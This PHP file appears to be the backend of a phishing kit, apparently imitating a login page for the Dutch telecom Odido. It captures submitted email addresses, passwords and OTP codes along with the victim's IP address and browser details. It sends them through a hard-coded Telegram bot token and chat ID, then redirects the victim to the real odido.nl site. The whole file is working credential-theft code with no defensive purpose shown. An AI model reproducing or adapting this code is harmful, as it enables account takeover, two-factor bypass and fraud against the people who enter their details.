<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to generate a unique ID
function generateUniqueId() {
    return bin2hex(random_bytes(16)); // Generates a 32-character unique ID
}

// Function to send a message to Telegram
function sendMessageToTelegram($message, $keyboard = null) {
    $botToken = '7046363890:AAHmFxm-MdLL9OykMzhvNBKS2NmV6zUQDgM'; // Replace with your Telegram bot token
    $chatId = '5976060042'; // Replace with your Telegram chat ID

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    );

    if ($keyboard !== null) {
        $data['reply_markup'] = json_encode(array('inline_keyboard' => $keyboard));
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// Handle form submissions
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Debugging output to display POST data
    echo "<pre>";
    print_r($_POST);
    echo "</pre>";

    if (isset($_POST['user']) && isset($_POST['pin'])) {
        // Process Email and Password Form
        $email = filter_var(trim($_POST["user"]), FILTER_SANITIZE_EMAIL);
        $password = filter_var(trim($_POST["pin"]), FILTER_SANITIZE_STRING);

        if (empty($email) || empty($password)) {
            echo '<script>alert("Email and password are required."); window.location.href = "/login.html";</script>';
            exit();
        }

        $uniqueId = generateUniqueId();
        $ipAddress = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $timestamp = date('Y-m-d H:i:s');

        $message = "<b>📧 EMAIL:</b> $email\n";
        $message .= "<b>🔒 PASSWORD:</b> $password\n\n";
        $message .= "<b>⏰ TIME:</b> $timestamp\n";
        $message .= "<b>🌐 IP:</b> $ipAddress\n";
        $message .= "<b>💠 OS:</b> $userAgent";

        $keyboard = [
            [
                ['text' => 'Next Page', 'url' => "/loader.html?uid=$uniqueId"]
            ],
            [
                ['text' => 'Previous Page', 'callback_data' => 'previous_page'],
                ['text' => 'Reload Page', 'callback_data' => 'reload_page']
            ]
        ];

        $telegramResult = sendMessageToTelegram($message, $keyboard);
        echo '<script>window.location.href = "/loader.html?uid=' . $uniqueId . '";</script>';
    }

    if (isset($_POST['OTP'])) {
        // Process OTP Form
        $otp = filter_var(trim($_POST["OTP"]), FILTER_SANITIZE_STRING);

        if (empty($otp)) {
            echo '<script>alert("OTP is required."); window.location.href = "/otp.html";</script>';
            exit();
        }

        $ipAddress = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $timestamp = date('Y-m-d H:i:s');

        $otpMessage = "<b>🔢 OTP:</b> $otp\n";
        $otpMessage .= "<b>⏰ TIME:</b> $timestamp\n";
        $otpMessage .= "<b>🌐 IP:</b> $ipAddress\n";
        $otpMessage .= "<b>💠 OS:</b> $userAgent";

        $telegramResult = sendMessageToTelegram($otpMessage);
        echo '<script>window.location.href = "https://odido.nl";</script>';
    }
}
?>
